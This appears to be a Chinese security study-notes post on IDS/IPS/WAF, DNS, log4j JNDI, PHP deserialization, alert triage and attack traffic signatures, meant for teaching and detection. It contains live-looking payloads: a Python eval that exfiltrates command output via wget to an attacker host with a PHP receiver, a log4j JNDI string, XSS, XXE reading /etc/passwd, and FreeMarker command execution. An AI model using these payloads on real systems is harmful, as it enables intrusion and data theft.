<p>IDS工作在网络层，旁路部署，通过抓取和分析网络流量来发现攻击；IPS一般也是在网络层旁路，可以理解为具备阻断能力的IDS，是IDS的升级版，可以覆盖网络层和应用层；WAF是在应用层防护Web攻击的程序，一般是跟Web接入层对接，可旁路可串行，仅能覆盖应用层</p>
<p>IPS的旁路防护原理很简单，其经典代表如开源的Snort，就是在网络上分析流量，发现符合规则的流量则冒充服务端回包响应客户端实现阻断或者替换的目的，这是一种典型的链路劫持手法。常见的场景是封禁网站（如非法网站的封禁）、篡改网页内容（运营商插广告）、阻断端口扫描和漏洞攻击（IPS），实施链路劫持的人必须控制某段网络。</p>
<p>因为IPS是旁路部署，所以只能通过发伪造包的方式来达到干扰双方正常通信的目的，正常的包其实还是会到达客户端和服务端，只不过相同序号的包操作系统已经处理过了，这些包会被认为是错误的包从而丢掉。</p>
<p>从原理分析，绕过IPS可以从两个方向着手：1）检测上，如果IPS在流量里检测不到攻击特征，则不会有后续动作；2）阻断上，正常包也会到达服务器，只是来晚了，如果有办法让伪造的包失效，则阻断不会发生。</p>
<h2 id="94-DNS的工作原理：">94.<strong>DNS的工作原理：</strong></h2>
<p>DNS( Domain Name System)是“域名系统”的英文缩写，是一种组织成域层次结构的计算机和网络服务命名系统，它用于TCP/IP网络，它所提供的服务是用来将主机名和域名转换为IP地址的工作。你可以把它想象成一本巨大的电话本。属于应用层协议；</p>
<p>正反向解析事两个不同得名称空间，是两颗不同得解析树；</p>
<p>正向：ip—》主机名</p>
<p>反向：主机名—》ip</p>
<p><strong>总结域名解析过程：</strong></p>
<p>按顺序查找，找到则成功退出</p>
<p>解析过程就是,他在电脑上应该是有缓存的,还有host文件有对应的域名解析,然后就是在DNS服务器上查找,</p>
<p>1.浏览器的DNS缓存查找，没有则2</p>
<p>2.操作系统的DNS缓存查找，没有则3</p>
<p>3.host文件查找，没有则4</p>
<p>4.TCP/IP设置的本地DNS服务器查找，没有则5</p>
<p>5.DNS服务器的缓存，如果缓存中也没找到，没有则6</p>
<p>6.13台根DNS，同上问讲的理想状态寻找，一层域，一层域找</p>
<h2 id="95-不回显可以外带">95.不回显可以外带</h2>
<p>eval(compile(“”“for x in range(1):\n import os\n os.popen(r’wget <a target="_blank" rel="noopener" href="http://axin.com:8000/shell.php?cmd=">http://axin.com:8000/shell.php?cmd=</a>”$(ls -la)”)read()”””,’’,’single’))</p>
<p>然后在我们的攻击机服务器axin.com上部署一份shell.php文件，文件内容如下：</p>
<?php
$a = fopen('POC.txt', 'a');
fwrite($a, $_GET["cmd"]);
fclose($a);
?>
<p>———————————————</p>
<h2 id="96-log4j2">96.log4j2</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://2lnhn2.ceye.io&#125;</span><br></pre></td></tr></table></figure>
<p><strong>JNDI</strong></p>
<blockquote>
<p>JNDI即<code>Java Naming and Directory Interface</code>（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p>
</blockquote>
<p>看不懂？看不懂就对了！</p>
<p>简单粗暴理解：有一个类似于字典的数据源，你可以通过JNDI接口，传一个name进去，就能获取到对象了。</p>
<p>那不同的数据源肯定有不同的查找方式，所以JNDI也只是一个上层封装，在它下面也支持很多种具体的数据源。</p>
<p><img src="https://pic2.zhimg.com/80/v2-d0762c11d23f228002926bc11fcd7915_720w.webp" alt="img"></p>
<p><strong>LDAP</strong></p>
<blockquote>
<p>LDAP即<code>Lightweight Directory Access Protocol</code>（轻量级目录访问协议），目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好像它的名字一样。</p>
</blockquote>
<p>看不懂？看不懂就对了！</p>
<p>这个东西用在统一身份认证领域比较多，但今天也不是这篇文章的重点。你只需要简单粗暴理解：有一个类似于字典的数据源，你可以通过LDAP协议，传一个name进去，就能获取到数据。</p>
<p>核心问题了：<strong>JNDI可以远程下载class文件来构建对象</strong></p>
<p>危险在哪里？</p>
<p>如果远程下载的URL指向的是一个黑客的服务器，并且下载的class文件里面藏有恶意代码，那不就完犊子了吗？</p>
<p><img src="https://pic2.zhimg.com/80/v2-88c6cb08e96edadf97850accc9a8929d_720w.webp" alt="img"></p>
<p>这就是鼎鼎大名的JNDI注入攻击！</p>
<h2 id="96-java中间件">96.java中间件</h2>
<p>消息队列中间件：<br>
Kafka、RabbitMQ、ActiveMQ、RocketMQ<br>
web server 中间件：<br>
<strong>Nginx</strong>（部署运维中间件）、OpenResty、<strong>Tomcat</strong>…<br>
应用服务中间件：<br>
<strong>weblogic</strong>、jetty<br>
缓存中间件：<br>
服务端缓存包括 <strong>Redis</strong>、Memcached…<br>
RPC框架：<br>
Tars、Dubbo、gRPC、Thrift<br>
数据库中间件：mycat、Sharding jdbc<br>
日志系统中间件：<br>
ELKB指的是一套解决方案，是Elasticsearch、Logstash 、 Kibana、Beats是这 4 种软件产品的首字母缩写。<br>
配置中心中间件：<br>
Apollo、zookeeper（分布式协调中间件） 统一配置管理 oAPI 网关，开源项目有 Tyk、kong、zuul、orange…<br>
事务处理中间件：<br>
seata、JDTX</p>
<h2 id="97-IDS和WAF的区别-IPS">97.**IDS和WAF的区别 **IPS</h2>
<p>IDS一般都是旁挂<br>
IPS是串联</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/allway2/article/details/108074904">https://blog.csdn.net/allway2/article/details/108074904</a></p>
<p><em><strong>*IPS*</strong></em> =入侵防御系统       IPS位于防火墙和网络设备之间，如果检测到威胁，IPS会在攻击扩散到网络其他地方之前阻断恶意通信</p>
<p><em><strong>*IDS*</strong></em> =入侵检测系统       IDS基于数据包嗅探技术，只能看着网络信息流过，不能反击网络攻击。IDS（入侵检测系统）是IPS的前身,所以用IPS就好</p>
<p><em><strong>*WAF*</strong></em> = Web应用程序防火墙</p>
<p>WAF是一种专门针对Web应用程序的安全防护工具，它可以监控和过滤Web应用程序的请求和响应，防止Web攻击，例如SQL注入、跨站点脚本攻击等。</p>
<p>IDS是一种可以检测和响应网络攻击的安全防护工具，它可以监控网络流量、系统日志和事件，并自动识别并响应潜在的攻击行为。</p>
<p>（我是这么回答的IDS和WAF都是用特征库匹配，强大与否就在于特征库是否强大，但是WAF还有一些其他功能可以设置白名单，防止页面串改，WAF还具备一定自主学习功能，能对不同的编码方式做强制多重转换还原称攻击铭文，把变形后的字符组合后再分析，之前看过一篇文章，他把IDS比作大楼的保安，WAF比作个人的保镖，WAF应该更具有针对性）<img src="C:%5CUsers%5C29506%5CDesktop%5C20200818131333621.png" alt="20200818131333621"></p>
<h2 id="98-反序列化的概念">98.反序列化的概念</h2>
<p><strong>将序列化后的字符串转换回对象或者数组。</strong></p>
<p>我们重新用上面的例子并把序列化的结果写入一个文本中存储：并读取内容进行反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;sdfsdfa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="number">1111</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$c</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="variable">$d</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;1.txt&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>-&gt;a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>反序列化的时候要保证有该类存在，因为没有序列化方法，所以我们反序列化回来还要依靠该类的方法进行</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;sdfsdfa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="number">1111</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = flase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar90</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;1.txr&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">print_</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>-&gt;a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="反序列化漏洞的产生">反序列化漏洞的产生</h3>
<p>为什么有反序列化的漏洞呢？</p>
<p>用k0rz3n师傅解释很清晰了：</p>
<blockquote>
<p>PHP 反序列化漏洞又叫做 PHP 对象注入漏洞，是因为程序对输入数据处理不当导致的. 反序列化漏洞的成因在于代码中的 <strong>unserialize() 接收的参数可控</strong>，从上面的例子看，这个函数的<strong>参数是一个序列化的对象</strong>，而序列化的对象<strong>只含有对象的属性</strong>，那我们就要利用对<strong>对象属性的篡改</strong>实现最终的攻击。</p>
</blockquote>
<p>一句话讲晒就是： <strong>反序列化漏洞是由于unserialize函数接收到了恶意的序列化数据篡改成员属性后导致的。</strong></p>
<h3 id="反序列化中常见的魔术方法">反序列化中常见的魔术方法</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__wakeup</span>()<span class="comment">//执行unserialize()时，先会调用这个函数</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()<span class="comment">//执行srialize()时，先会调用这个函数</span></span><br><span class="line">__construct<span class="comment">//对象被创建时触发</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()<span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>()<span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//当尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure>
<p>下面通过一个例子来了解一下魔法函数被自动调用的过程</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr1</span>=<span class="string">&quot;abc&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr2</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echoP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;varr1.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__construct&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__destruct&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;__toString&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__sleep&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;varr1&#x27;</span>,<span class="string">&#x27;varr2&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();  <span class="comment">//实例化对象，调用__construct()方法，输出__construct</span></span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">echoP</span>();   <span class="comment">//调用echoP()方法，输出&quot;abc&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;    <span class="comment">//obj对象被当做字符串输出，调用__toString()方法，输出__toString</span></span><br><span class="line"><span class="variable">$s</span> =<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);  <span class="comment">//obj对象被序列化，调用__sleep()方法，输出__sleep</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>);  <span class="comment">//$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。</span></span><br><span class="line"><span class="comment">// 脚本结束又会调用__destruct()方法，输出__destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>再补一下</p>
<p><strong>__toString的唤醒是在destruct之前的</strong></p>
<p>如图</p>
<p><img src="https://image.3001.net/images/20221019/1666144035_634f57239eb47d7cabf50.png!small" alt="1666007704969.png"></p>
<p>__invoke</p>
<p>这个是我所不熟悉的，原来是这个意思<img src="https://image.3001.net/images/20221019/1666144083_634f5753f41beba50fc96.png!small" alt="1666007994884.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__call : 在对象中调用一个不可访问方法时调用。</span><br></pre></td></tr></table></figure>
<p>__call<br>
<img src="https://image.3001.net/images/20221019/1666144109_634f576dcb1503d09bc42.png!small" alt="1666008283124.png"></p>
<h2 id="99-日志被删除">99.日志被删除</h2>
<p>使用 lsof 命令查看当前是否有进程打开 / var/log/日志文件.log</p>
<p><code>lsof|grep/var/log/secure</code></p>
<p>rsyslogd1264root4wREG 8,13173904263917/var/log/secure(deleted)</p>
<p>从上面的信息可以看到 PID 1264（rsyslogd）打开文件的文件描述符为 4。同时还可以看到 / var/log/ secure 已经标记为被删除了。因此我们可以在 / proc/1264/fd/4（fd 下的每个以数字命名的文件表示进程对应的文件描述符）中查看相应的信息，如下：</p>
<p>查看/proc/1264/fd/4就能得到被删除的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@hlmcen69n3~]#tail/proc/1264/fd/4</span><br></pre></td></tr></table></figure>
<h2 id="100-如果一个木马启动了，并自删除，注入其它进程中，如何获取样本，并提交给WEB工程师分析">100.如果一个木马启动了，并自删除，注入其它进程中，如何获取样本，并提交给WEB工程师分析</h2>
<p>od dump内存出来</p>
<h2 id="101-大量流量告警如何快速排查技巧">101.大量流量告警如何快速排查技巧</h2>
<ul>
<li><strong>判断误报</strong></li>
</ul>
<p>攻击方尝试利用现成的「EXP&amp;POC集成脚本工具」对资产目标进行检测扫描，安全设备检测到「攻击尝试行为」中的攻击特征就会产生告警。在通常情况下，可以把告警中的URL的“网页状态码”、“页面回显数据”作为「误报告警」判断的条件之一。</p>
<ul>
<li><strong>过滤无效报警</strong></li>
</ul>
<p>攻击方通过对目标资产所处的C段进行批量扫描，但C段的资产并非都是处于「活跃」状态，甚至根本没有这个资产。而安全设备还是因为这个「攻击尝试行为」产生了告警，那么这种告警就属于「无效告警」。</p>
<ul>
<li><strong>提取有效特征</strong></li>
</ul>
<p>进行正则匹配</p>
<h2 id="102-中间件漏洞流量特征">102.中间件漏洞流量特征</h2>
<p><strong>tomcat</strong> --弱口令爆破</p>
<p><strong>SQL</strong> --用的命令 函数</p>
<p><strong>XSS</strong> --查看是否出现script标签<script>alert(11);</script><br>
查看是否出现img标签&lt;img src=1 οnerrοr=alert(21);&gt;<br>
查看是否出现input标签&lt;input οnfοcus=alert(31);&gt;<br>
查看是否出现svg 标签&lt;svg οnlοad=alert(41);&gt;<br>
查看是否出现select 标签&lt;select οnfοcus=alert(51)&gt;</select><br>
查看是否出现iframe 标签&lt;iframe οnlοad=alert(61);&gt;</iframe></p>
<p><strong>SSRF</strong> –</p>
<p>file协议/gopher协议/ftp协议/dict协议</p>
<p>绕过ssrf会使用一些特殊字符eg：‘。’‘[: :]’等一些特殊的字符，也可能出现各种编码/进制进行写IP地址，或者特殊的域名eg：<a target="_blank" rel="noopener" href="http://xip.io">xip.io</a>。</p>
<p><strong>XXE</strong> –</p>
<p>若报文中的system后面出现了url，要着重注意，（因为外部实体的声明使用SYSTEM关键字，并且必须指定一个URL，从该URL可以加载实体的值。）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;http://normal-website.com&quot; &gt; ]&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; ]&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;php://filter://path/to/file&quot; ]&gt;</span><br><span class="line">&lt;!ENTITY lyq SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>data://协议</p>
<p>·file://协议加文件上传</p>
<p>·php://filter协议加文件上传</p>
<p><strong>freemaker模版注入</strong><br>
deviceUdid=${“freemarker.template.utility.Execute”?new()(&quot;wget <a target="_blank" rel="noopener" href="http://downlo">http://downlo</a>%6</p>
<p>&lt;#assign test=“freemarker.template.utility.Execute”?new()&gt; ${test(“open /Applications/Calculator.app”)}</p>
<p>error=&amp;deviceUdid=${&quot;freemarker.template.utility.Exe%6<br>
<strong>LDAP注入</strong></p>
<p>LDAP轻量级目录访问协议，是一种在线目录访问协议，主要用于目录中资源的搜索和查询。</p>
<p>如果出现一些运算符（=、|、||、&amp;、&amp;&amp;、！(非)、*(通配符)等），因为这些运算符都是LDAP的基本语法。</p>
<p>例如：</p>
<p>ldap://austin.ibm.com/ou=Austin,o=IBM</p>
<p>ldap:///ou=Austin,o=IBM??sub?(cn=Joe Q. Public)</p>
<p>LDAP注入攻击面</p>
<p>(&amp;(parameter1=value1)(parameter2=value2))</p>
<p>value1和value2可以换成注入代码</p>
<p><strong>文件包含漏洞</strong></p>
<p>文件包含会出现4个函数：</p>
<p>include()  include_once()  require() require_once()</p>
<h2 id="103-设备全关的情况下如何排查webshell">103.设备全关的情况下如何排查webshell</h2>
<p>看34</p>
<h2 id="104-如何在服务器上无设备排查漏洞-web服务器">104.如何在服务器上无设备排查漏洞(web服务器)</h2>
<p>禁用不必要的服务</p>
<p>弱口令</p>
<p>将怎么渗透?</p>
<p>可以写半自动化脚本判断是否有漏洞</p>
<h2 id="105-CORS漏洞">105.CORS漏洞</h2>
<h2 id="漏洞原理">漏洞原理</h2>
<ul>
<li>CORS，即跨源资源共享（Cross-Origin Resource Sharing）。同源策略（Same OriginPolicy）要求不同源之间是无法通信的，而CORS则是放宽同源策略以通过浏览器实现网站之间通信的机制。</li>
<li>CORS全称为Cross-Origin Resource Sharing即跨域资源共享，用于绕过SOP（同源策略）来实现跨域资源访问的一种技术。<br>
CORS漏洞则是利用CORS技术窃取用户敏感数据，CORS漏洞的成因是服务端配置的规则不当所导致的，服务器端没有配置Access-Control-Allow-Origin等字段</li>
</ul>
<h2 id="漏洞危害">漏洞危害</h2>
<p>1、获取用户数据<br>
2、客户端缓存中毒：这种配置允许攻击者利用其他的漏洞，更改没有验证的字段，看是否正常回显。比如，一个应用返回数据报文头部中包含“X-User”这个字段，这个字段的值没有经过验证就直接输出到返回页面上，此时就可以结合XSS漏洞来利用。<br>
3、服务端缓存中毒：利用CORS的错误配置注入HTTP头部，这可能会被服务器端缓存下来，比如制造存储型xss</p>
<h2 id="测试方法">测试方法</h2>
<ul>
<li>查看是否存在get请求的json形式敏感信息，在请求头中添加任意Origin值，如<a href="https://evil.xn--com,:access-control-allow-origin:https-p059do49bba822wts1ktzpa9z4nfj5jea//evil.com%E5%92%8CAccess-Control-Allow-Credentials%EF%BC%9Atrue%EF%BC%8C%E8%8B%A5%E8%BF%94%E5%9B%9E%EF%BC%8C%E5%88%99%E6%9E%84%E9%80%A0poc.html%E8%BF%9B%E8%A1%8C%E8%B7%A8%E5%9F%9F%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%E3%80%82">https://evil.com，查看返回头是否返回：Access-Control-Allow-Origin:https://evil.com和Access-Control-Allow-Credentials：true，若返回，则构造poc.html进行跨域读取数据。</a></li>
<li>CORS配置不当通常会导致的危害是用户敏感信息泄露，场景大多数是get请求方式返回的json形式的敏感信息（密钥、token，key等）。CORS配置不当属于响应头中的一种，其他还有X-Frame-Options、Content-Security-Policy等。漏洞利用成功的前提是，两个返回头必须为：Access-Control-Allow-Origin:<a target="_blank" rel="noopener" href="https://evil.com/">https://evil.com</a><br>
更改响应头Access-Control-Allow-Origin或Origin字段等，看返回头是否返回CORS配置字段</li>
</ul>
<h2 id="106-钓鱼邮件处理-如何排查恶意外链类型">106.钓鱼邮件处理,如何排查恶意外链类型</h2>
<p>跳转的文字属性跟SRC不一致</p>
<p>恶意跳转的话就知道这些</p>
<h2 id="107-攻击事件复现流程">107.攻击事件复现流程</h2>
<ol>
<li><strong>准备环境</strong>：搭建一个与实际生产环境相似的测试环境。这可能涉及到配置网络设备、服务器、应用程序等，并确保它们的配置与实际环境尽可能一致。</li>
<li><strong>收集信息</strong>：收集与攻击事件相关的信息，包括攻击手法、攻击目标、攻击者使用的工具和技术等。</li>
<li><strong>模拟攻击</strong>：使用模拟工具或技术对测试环境进行攻击。这可能涉及到利用漏洞、进行端口扫描、尝试弱口令、发送恶意软件等。</li>
<li><strong>监控与记录</strong>：在攻击过程中，及时监控系统日志、网络流量等信息，并记录攻击过程中的关键步骤和事件。</li>
<li><strong>分析与评估</strong>：对攻击过程中收集到的信息进行分析，了解攻击者的行为和目的，并评估攻击对系统的影响和潜在风险。</li>
<li><strong>修复与加固</strong>：根据分析结果，采取相应的修复措施和加固措施，以防止类似攻击事件再次发生。</li>
<li><strong>总结与报告</strong>：对攻击复现过程进行总结，并撰写报告，包括攻击事件的详细描述、影响分析、修复建议等内容，以便后续改进安全策略和措施。****</li>
</ol>
<h2 id="108-能getshell的漏洞">108.能getshell的漏洞</h2>
<p>文件上传</p>
<p>命令执行漏洞</p>
<p>解析漏洞</p>
<p>sql注入,文件写入直接命令执行</p>
<p>文件包含</p>
<p>oday,nday</p>
<p>弱口令</p>
<h2 id="109-反序列化的中间件">109.反序列化的中间件</h2>
<p>shiro</p>
<p>WebLogic</p>
<p>thinkphp</p>
<p>fastjson</p>
<p>Jboss</p>
<h2 id="110-sql注入告警分析">110.sql注入告警分析</h2>
<p><strong>根据数据包回显，判断注入是否成功，如果成功可以直接上报研判，如果没有成功，但一直在尝试攻击，我们也可以上报研判，进行封禁IP。</strong></p>
<p><strong>请求报文中有特殊的sql字符，比如，and、or、id=1、updatexml、select、union等。</strong></p>
<p><strong>响应报文中有一些sql回显，就比如一些连续的错误回显或者登陆成功的回显。</strong></p>
<h2 id="111-隧道通信，对应的流量特征-dns，icmp等">111.隧道通信，对应的流量特征 dns，icmp等</h2>
<h3 id="dns"><strong>dns</strong></h3>
<p><strong>建立链接的包分析</strong></p>
<p>在客户端启动后，会向服务器发送DNS请求包</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/202405121000707.jpeg" alt="img"></p>
<p>客户端情报求包，请求包的type类型为10 (未知，可以作为检测的一种特征)，数据作为域名前缀</p>
<p><a target="_blank" rel="noopener" href="http://yrbh1o.ns.dnstuneltest.com">yrbh1o.ns.dnstuneltest.com</a>, yrbh1o就是请求的数据</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/202405121000834.jpeg" alt="img"></p>
<p>服务器响应包，rdata字段携带数据，因为查询包没有指定查询类型，所以rdata字段没有长度限制(限制于UDP最大包长512字节)</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/202405121000033.jpeg" alt="img"></p>
<p>采用中继模式，客户端会一直发送心跳包，保持链接（因为DNS服务器不会直接与客户端发起链接，所以客户端会一直想服务器发送数据包）但是DNS协议的字段格式已经损坏。</p>
<p><strong>通信流量包分析</strong></p>
<p>通信过程的中的DNS协议格式已经损坏，wireshark已经无法正确分析</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/202405121002050.jpeg" alt="img"></p>
<p>正常DNS的数据包中的query字段的形式是所占字节-三级域名-所占字节-二级域名-所占字节-一级域名形式并且正常的query字段时只有再域名结束时才会出现00阶段。</p>
<p>05fanyi05baidu03com</p>
<p>隧道中的流量明显不符合上文的query字段规定。由60 08开头。</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/202405121003902.jpeg" alt="img"></p>
<h3 id="ICMP">ICMP</h3>
<p><strong>ICMP隧道流量特征</strong></p>
<p>流量检测关键点：</p>
<ul>
<li>单位时间内数据包的数量</li>
<li>单组数据包Data字段长度</li>
<li>单组数据包Data字段内容</li>
</ul>
